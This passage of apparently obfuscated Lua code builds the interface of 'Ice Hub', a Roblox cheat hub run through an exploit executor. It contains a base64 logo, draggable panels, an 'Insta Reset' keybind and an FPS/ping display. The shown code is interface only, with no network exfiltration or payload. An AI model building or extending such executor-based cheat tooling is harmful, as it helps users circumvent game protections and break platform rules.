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"))
															end

															png = getsynasset("icehub_logo.png")
														end
													end)

													return png
												end

												v84 = fn52()
											end
										end

										tbl17.screenGui = Instance.new(v82[84])
										tbl17.screenGui.Name = "ICE_HUB_MAIN_GUI"
										tbl17.screenGui:SetAttribute("IceHubOwned", true)
										tbl17.screenGui.ResetOnSpawn = v82[120]
										tbl17.screenGui.DisplayOrder = 999
										tbl17.screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
										fn29(tbl17.screenGui)
										screenGui = tbl17.screenGui

										createUIGradient = function(parent, arg)
											local uiGradient = Instance.new("UIGradient")
											uiGradient.Color = ColorSequence.new(arg or tbl17.ACCENT_KEYS)
											uiGradient.Rotation = 0
											uiGradient.Parent = parent
											table.insert(tbl17.allGradients, uiGradient)
											return uiGradient
										end

										createUIStroke = function(parent, thickness)
											local uiStroke = Instance.new("UIStroke")
											uiStroke.Thickness = thickness or v82[23]
											uiStroke.Color = tbl17.COL_WHITE
											uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
											uiStroke.Parent = parent
											createUIGradient(uiStroke)
											return uiStroke
										end

										createUICorner = function(parent, arg)
											local uiCorner = Instance.new("UICorner")
											uiCorner.CornerRadius = UDim.new(v82[46], arg or 10)
											uiCorner.Parent = parent
											return uiCorner
										end

										fn48 = function(arg, arg2, arg3)
											local flag20 = false
											local position = nil
											local position2 = nil

											local function fn51(arg4)
												if not flag20 then
													return
												end
												local n37 = arg4.Position - position
												arg.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n37.X, position2.Y.Scale, position2.Y.Offset + n37.Y)
											end

											local v85

											pcall(function()
												arg2.InputBegan:Connect(function(input)
													if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
														flag20 = true
														position = input.Position
														position2 = arg.Position

														input.Changed:Connect(function()
															if input.UserInputState == Enum.UserInputState.End then
																flag20 = false

																if arg3 then
																	if tbl18.panels and tbl18.panels[arg3] then
																		tbl18.panels[arg3].x = arg.Position.X.Scale
																		tbl18.panels[arg3].xOffset = arg.Position.X.Offset
																		tbl18.panels[arg3].y = arg.Position.Y.Scale
																		tbl18.panels[arg3].yOffset = arg.Position.Y.Offset
																		fn36()
																	else
																		fn38(arg, arg3)
																	end
																end
															end
														end)
													end
												end)

												arg2.InputChanged:Connect(function(input)
													if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
														v85 = input
													end
												end)

												UserInputService.InputChanged:Connect(function(input)
													if input == v85 and flag20 then
														fn51(input)
													end
												end)
											end)
										end

										do
											local r2 = Enum.KeyCode.R

											UserInputService.InputBegan:Connect(function(input, gameProcessed)
												if gameProcessed then
													return
												end

												if input.KeyCode == r2 then
													fn50()
												end
											end)
										end
									end

									do
										local screenGui2 = Instance.new("ScreenGui")
										screenGui2.Name = "ICE_HUB_INSTA_RESET_GUI"
										screenGui2:SetAttribute(v82[62], true)
										screenGui2.ResetOnSpawn = false
										screenGui2.DisplayOrder = 1004
										screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
										fn29(screenGui2)
										r = Enum.KeyCode.R
										flag18 = v82[120]
										flag19 = false
										n35 = isMobile and 118 or 124
										n36 = isMobile and 220 or 240
										instance2 = Instance.new(v82[53])
										instance2.Name = v82[137]
										instance2.Size = UDim2.new(0, n36, 0, n35)
										local udim2 = UDim2.new(v82[91], -n36 / 2, v82[91], isMobile and 90 or 120)
										fn37(instance2, "instaReset", udim2)
										instance2.BackgroundColor3 = Color3.fromRGB(v82[188], 14, v82[198])
										instance2.BackgroundTransparency = 0.68
										instance2.BorderSizePixel = 0
										instance2.Active = true
										instance2.ClipsDescendants = v82[76]
										instance2.ZIndex = 30
										instance2.Parent = screenGui2
									end

									do
										createUICorner(instance2, 12)
										createUIStroke(instance2, 2)
										frame2 = Instance.new("Frame")
										frame2.Size = UDim2.new(1, v82[46], 0, 36)
										frame2.BackgroundColor3 = Color3.fromRGB(18, 62, 108)
										frame2.BackgroundTransparency = v82[118]
										frame2.BorderSizePixel = 0
										frame2.Active = true
										frame2.ZIndex = v82[198]
										frame2.Parent = instance2
										createUICorner(frame2, 12)

										do
											local instance3 = Instance.new(v82[53])
											instance3.Size = UDim2.new(1, 0, 0, 12)
											instance3.Position = UDim2.new(0, 0, 1, -12)
											instance3.BackgroundColor3 = Color3.fromRGB(18, 62, 108)
											instance3.BackgroundTransparency = v82[118]
											instance3.BorderSizePixel = 0
											instance3.ZIndex = 31
											instance3.Parent = frame2
										end
									end

									do
										local textLabel = Instance.new("TextLabel")
										textLabel.Size = UDim2.new(1, -v82[181], 1, 0)
										textLabel.Position = UDim2.new(0, 10, 0, 0)
										textLabel.BackgroundTransparency = 1
										textLabel.Text = "Ice Hub - Insta Reset"
										textLabel.TextColor3 = tbl17.COL_WHITE
										textLabel.TextSize = isMobile and 12 or 13
										textLabel.Font = Enum.Font.GothamBlack
										textLabel.TextXAlignment = Enum.TextXAlignment.Left
										textLabel.ZIndex = 32
										textLabel.Parent = frame2
									end
								end

								do
									local instance3

									do
										instance3 = Instance.new(v82[139])
										instance3.Size = UDim2.new(v82[46], 24, v82[46], v82[58])
										instance3.Position = UDim2.new(1, -31, 0.5, -12)
										instance3.BackgroundColor3 = Color3.fromRGB(18, 65, 112)
										instance3.BackgroundTransparency = v82[99]
										instance3.BorderSizePixel = 0
										instance3.Text = "-"
										instance3.TextColor3 = tbl17.COL_WHITE
										instance3.TextSize = 13
										instance3.Font = Enum.Font.GothamBlack
										instance3.AutoButtonColor = false
										instance3.ZIndex = 33
										instance3.Parent = frame2
										createUICorner(instance3, 6)
										createUIStroke(instance3, 1)
										fn48(instance2, frame2, "instaReset")

										do
											local textButton = Instance.new("TextButton")
											textButton.Size = UDim2.new(v82[118], -20, v82[46], 34)
											textButton.Position = UDim2.new(0, 10, 0, 43)
											textButton.BackgroundColor3 = Color3.fromRGB(15, 31, 57)
											textButton.BackgroundTransparency = 0.45
											textButton.BorderSizePixel = 0
											textButton.Text = "Reset"
											textButton.TextColor3 = tbl17.COL_WHITE
											textButton.TextSize = isMobile and v82[78] or 13
											textButton.Font = Enum.Font.GothamBlack
											textButton.TextXAlignment = Enum.TextXAlignment.Left
											textButton.AutoButtonColor = false
											textButton.ZIndex = 31
											textButton.Parent = instance2
											createUICorner(textButton, 7)
											createUIStroke(textButton, 1)
											local uiPadding = Instance.new("UIPadding")
											uiPadding.PaddingLeft = UDim.new(0, 10)
											uiPadding.Parent = textButton

											textButton.MouseButton1Click:Connect(function()
												fn50()
											end)
										end
									end

									local frame3

									do
										frame3 = Instance.new("Frame")
										frame3.Size = UDim2.new(1, -20, 0, 34)
										frame3.Position = UDim2.new(0, v82[4], 0, 82)
										frame3.BackgroundColor3 = Color3.fromRGB(v82[42], 31, v82[147])
										frame3.BackgroundTransparency = 0.45
										frame3.BorderSizePixel = 0
										frame3.ZIndex = 31
										frame3.Parent = instance2
										createUICorner(frame3, 7)
										createUIStroke(frame3, v82[118])

										do
											local textLabel = Instance.new("TextLabel")
											textLabel.Size = UDim2.new(1, -v82[13], 1, 0)
											textLabel.Position = UDim2.new(0, 10, 0, 0)
											textLabel.BackgroundTransparency = 1
											textLabel.Text = "Keybind"
											textLabel.TextColor3 = tbl17.COL_WHITE
											textLabel.TextSize = isMobile and 11 or 12
											textLabel.Font = Enum.Font.GothamBold
											textLabel.TextXAlignment = Enum.TextXAlignment.Left
											textLabel.ZIndex = 32
											textLabel.Parent = frame3
										end
									end

									do
										local textButton = Instance.new("TextButton")
										textButton.Size = UDim2.new(v82[46], 50, 0, 22)
										textButton.Position = UDim2.new(1, -v82[128], 0.5, -11)
										textButton.BackgroundColor3 = Color3.fromRGB(12, 48, v82[141])
										textButton.BackgroundTransparency = v82[45]
										textButton.BorderSizePixel = v82[46]
										textButton.Text = "[R]"
										textButton.TextColor3 = tbl17.COL_WHITE
										textButton.TextSize = v82[4]
										textButton.Font = Enum.Font.GothamBlack
										textButton.AutoButtonColor = false
										textButton.ZIndex = v82[153]
										textButton.Parent = frame3
										createUICorner(textButton, 6)
										createUIStroke(textButton, 1)

										textButton.MouseButton1Click:Connect(function()
											if flag18 then
												return
											end
											flag18 = v82[76]
											textButton.Text = "..."
											local connection = nil

											connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
												if gameProcessed or input.KeyCode == Enum.KeyCode.Unknown then
													return
												end
												connection:Disconnect()
												r = input.KeyCode
												flag18 = false
												textButton.Text = "[" .. tostring(input.KeyCode):gsub("Enum%.KeyCode%.", "") .. "]"
											end)
										end)
									end

									UserInputService.InputBegan:Connect(function(input, gameProcessed)
										if gameProcessed or flag18 then
											return
										end

										if input.KeyCode == r then
											fn50()
										end
									end)

									instance3.MouseButton1Click:Connect(function()
										flag19 = not flag19
										instance3.Text = flag19 and "+" or "-"
										TweenService:Create(instance2, TweenInfo.new(0.22, Enum.EasingStyle.Quint), { Size = UDim2.new(0, n36, 0, flag19 and v82[149] or n35) }):Play()
									end)
								end
							end
						end

						local n35, n36

						do
							hudWidth = isMobile and 320 or 340
							hudHeight = isMobile and 76 or v82[12]
							n35 = isMobile and 48 or 46
							n36 = isMobile and v82[90] or 10
							n32 = isMobile and 10 or 12
							n33 = n32 + n35 + (isMobile and v82[188] or v82[90])
							tbl17.HUD_WIDTH = hudWidth
							tbl17.HUD_HEIGHT = hudHeight
							instance = Instance.new(v82[53])
							instance.Name = v83()
							instance.Size = UDim2.new(0, hudWidth, 0, hudHeight)
							instance.Position = UDim2.new(0.5, -hudWidth / 2, 0, n33)
							instance.BackgroundColor3 = Color3.fromRGB(7, v82[198], 61)
							instance.BackgroundTransparency = 0.62
							instance.BorderSizePixel = 0
							instance.Visible = true
							instance.ZIndex = 2
							instance.Parent = screenGui
							instance.Active = false
							createUICorner(instance, 14)

							do
								local instance2 = Instance.new(v82[96])
								local colorSequence = ColorSequence.new
								local tbl20 = {}
								local v85 = ColorSequenceKeypoint.new(v82[46], Color3.fromRGB(6, 25, v82[143]))
								local v86 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(9, 45, v82[7]))
								local new = ColorSequenceKeypoint.new
								local v87 = v82[118]
								local color = Color3.fromRGB
								local v88 = v82[58]
								local v89 = v82[19]
								tbl20[1] = v85
								tbl20[2] = v86

								do
									local values = table.pack(new(v87, color(5, v88, v89)))
									table.move(values, 1, values.n, 3, tbl20)
								end

								instance2.Color = colorSequence(tbl20)
								instance2.Rotation = 90
								instance2.Parent = instance
							end
						end

						do
							createUIStroke(instance, 2)

							do
								local instance2 = Instance.new(v82[176])
								instance2.Size = UDim2.new(1, v82[46], v82[46], isMobile and 25 or 27)
								instance2.Position = UDim2.new(0, 0, 0, v82[61])
								instance2.BackgroundTransparency = v82[118]
								instance2.Text = "Ice Hub"
								instance2.TextColor3 = tbl17.COL_WHITE
								instance2.TextSize = isMobile and v82[60] or 20
								instance2.Font = Enum.Font.GothamBlack
								instance2.TextXAlignment = Enum.TextXAlignment.Center
								instance2.ZIndex = 3
								instance2.Parent = instance
								createUIGradient(instance2)
							end
						end

						do
							local textLabel = Instance.new("TextLabel")
							textLabel.Size = UDim2.new(1, 0, 0, 18)
							textLabel.Position = UDim2.new(0, 0, v82[46], isMobile and 29 or 31)
							textLabel.BackgroundTransparency = 1
							textLabel.Text = "discord.gg/icehub"
							textLabel.TextColor3 = Color3.fromRGB(125, v82[31], 255)
							textLabel.TextSize = isMobile and 14 or 14
							textLabel.Font = Enum.Font.GothamBold
							textLabel.TextXAlignment = Enum.TextXAlignment.Center
							textLabel.ZIndex = 3
							textLabel.Parent = instance
						end

						tbl17.statsLabel = Instance.new("TextLabel")
						tbl17.statsLabel.Size = UDim2.new(1, 0, v82[46], v82[190])
						tbl17.statsLabel.Position = UDim2.new(v82[46], 0, 0, isMobile and v82[150] or 52)
						tbl17.statsLabel.BackgroundTransparency = v82[118]
						tbl17.statsLabel.Text = "FPS: -- PING: --ms"
						tbl17.statsLabel.TextColor3 = tbl17.COL_WHITE
						tbl17.statsLabel.TextSize = isMobile and 12 or 13
						tbl17.statsLabel.Font = Enum.Font.GothamBold
						tbl17.statsLabel.TextXAlignment = Enum.TextXAlignment.Center
						tbl17.statsLabel.ZIndex = 3
						tbl17.statsLabel.Parent = instance
						tbl17.topButtons = {}
						n34 = 3 * n35 + 2 * n36
						frame = Instance.new("Frame")
						frame.Name = v83()
						frame.Size = UDim2.new(0, n34, 0, n35)

						do
							local udim2 = UDim2.new(0.5, -n34 / 2, v82[46], n32)
